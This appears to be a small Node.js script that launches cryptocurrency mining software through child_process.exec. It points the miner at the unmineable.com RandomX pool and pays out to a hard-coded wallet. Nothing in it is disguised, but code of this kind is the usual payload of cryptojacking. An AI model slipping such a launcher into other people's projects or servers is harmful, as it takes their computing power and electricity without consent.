const { exec } = require('child_process');

const command = '--algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet JUP:8FK2zGjbYApVW77eaNvUzSFZ5AqK3a1R4zNBNL5ByW7P.unmineable_worker_fqyinvze#gse8-vr3z';

exec(`mining-software ${command}`, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
